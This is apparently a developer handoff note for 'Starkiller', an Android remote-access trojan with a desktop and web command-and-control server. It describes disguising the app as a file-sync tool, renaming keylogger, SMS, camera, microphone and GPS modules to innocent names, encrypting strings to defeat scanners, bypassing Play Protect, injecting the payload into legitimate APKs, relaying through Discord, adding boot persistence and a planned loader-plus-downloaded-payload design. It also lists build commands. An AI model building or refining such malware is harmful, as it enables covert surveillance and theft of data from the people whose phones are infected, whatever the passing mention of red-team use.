# STARKILLER HANDOFF — 2026-06-24

## Current State

Phase 3. Play Protect bypass confirmed. VNC live-tested. GUI refactored.

## What's Built

### Android Client
- Package: `com.georgetech.filesync` — legitimate-looking sync app
- App name: "Remote Desktop"
- 12 modules (lazy-loaded), all renamed to innocent names
- Dispatcher uses `modA`-`modJ` — zero semantic identifiers in DEX
- All protocol strings encrypted (XOR+Base64 via Crypt.kt)
- Config injected at build time (encrypted host/port)
- R8 enabled on debug + release
- DEX scan: ZERO payload identifiers
- **Manifest stripped** — no dangerous permissions, no Accessibility, no NotificationListener
- APK size: 1541 KB

### C2 GUI
- `server/starkiller_gui.py` — tkinter desktop C2 controller
- **Flicker fixed** — state-diffed refresh, widgets only rebuilt on change
- Ops trimmed to working set: SYSINFO, WIFI, APPS, SCREEN, SCR GRANT, FILES, EXEC, PING
- VNC frame counter + interval display in screen panel
- ms interval field in VNC bar + `!vnc <ms>` console command
- Discord relay class for internet C2 (NAT bypass)

### C2 Web Dashboard
- `server/starkiller_c2.py` — embedded HTML dashboard on :8666
- Agent listener on :8667

### Evasion Pipeline
- `obfuscate.py` — string encryption, ProGuard generation, DEX string table scanner
- `binder.py` — APK injection into legit apps (decompile + Smali inject + sign)

### Test Suite
- `server/test_client.py` — simulated Samsung Galaxy S24 Ultra
- `test_headless.py` — 38 automated tests across 10 phases (38/38 PASS)

## Class Name Mapping

| Original | Current | Purpose |
|----------|---------|---------|
| `com.starkiller.agent` | `com.georgetech.filesync` | Package |
| `StarKillerService` | `SyncService` | Foreground service |
| `C2Client` | `SyncAdapter` | TCP client |
| `TaskRouter` | `Dispatcher` | Task dispatch |
| `CameraCapture` | `PhotoHelper` | Camera module |
| `MicRecorder` | `AudioHelper` | Mic recording |
| `ScreenCapture` | `DisplayHelper` | Screen capture/VNC |
| `GpsTracker` | `LocProvider` | GPS location |
| `SmsModule` | `MsgReader` | SMS read/send |
| `ContactsDump` | `AddrBook` | Contacts export |
| `FileManager` | `StorageHelper` | File operations |
| `DeviceInfo` | `SysInfo` | Device info + WiFi |
| `KeyLogService` | `InputService` | Accessibility keylogger |
| `NotifListenerService` | `AlertService` | Notification interception |
| `BootReceiver` | `StartReceiver` | Boot persistence |
| `CallLogReader` | `HistoryReader` | Call history |
| `AppList` | `PkgScanner` | Installed apps |

Dispatcher lazy properties: `modA`-`modJ` (SysInfo through PkgScanner, in order).

## Live Test Status (2026-06-24, Samsung SM-G970U, Android 12)

| Feature | Status | Notes |
|---------|--------|-------|
| TCP handshake | PASS | |
| Registration | PASS | |
| sysinfo | PASS | |
| apps (320 installed) | PASS | |
| ping | PASS | |
| VNC stream | PASS | live screen confirmed, no flicker |
| screenshot | PASS | single frame capture |
| exec | PASS | shell commands work |
| wifi | UNTESTED | new op, not yet run on device |
| Play Protect | PASS | "unsigned app" only, no block |
| GPS / SMS / contacts | FAIL (by design) | stripped from manifest |
| camera / mic | FAIL (by design) | stripped from manifest |

## Current Manifest Permissions (test build)

```
INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE
QUERY_ALL_PACKAGES
FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC
FOREGROUND_SERVICE_MEDIA_PROJECTION
WAKE_LOCK
```

No dangerous permissions. No RECEIVE_BOOT_COMPLETED. No Accessibility. No NotificationListener.

## What's Next

1. **Test wifi op** on device
2. **Internet tunneling** — playit.gg or Discord relay for non-LAN access
3. **Full-permission build** — add dangerous perms back for camera/mic/SMS/GPS ops when needed for red team assessment (adb install or disable Play Protect)
4. **Boot persistence** — re-enable RECEIVE_BOOT_COMPLETED for prod build
5. **Phase 4 FUD** — split-APK architecture (clean loader + downloaded payload) for full-permission Play Protect bypass

## Build Commands

```bash
python setup.py                                           # one-time SDK setup
python build.py --ip 192.168.x.x --port 8667 --name "Remote Desktop"
python server/starkiller_gui.py                           # start GUI C2
python server/test_client.py --ip 127.0.0.1              # test without phone
python test_headless.py                                   # 38 automated tests
python obfuscate.py scan payloads/starkiller-debug.apk   # verify FUD
```

## Key Files

| File | Purpose |
|------|---------|
| `build.py` | Build APK with encrypted C2 config |
| `binder.py` | Inject payload into legit APK |
| `obfuscate.py` | Encryption + ProGuard + DEX scanner |
| `setup.py` | Android SDK + Gradle setup |
| `server/starkiller_gui.py` | Desktop GUI C2 |
| `server/starkiller_c2.py` | Web dashboard C2 |
| `server/test_client.py` | Simulated Android agent |
| `test_headless.py` | 38 automated tests |
| `client/app/proguard-rules.pro` | R8 obfuscation rules |
| `client/app/build.gradle.kts` | Android build config |
| `client/app/src/main/AndroidManifest.xml` | Permissions + components |

---

*Phase 3 locked. VNC live. Play Protect bypassed.*
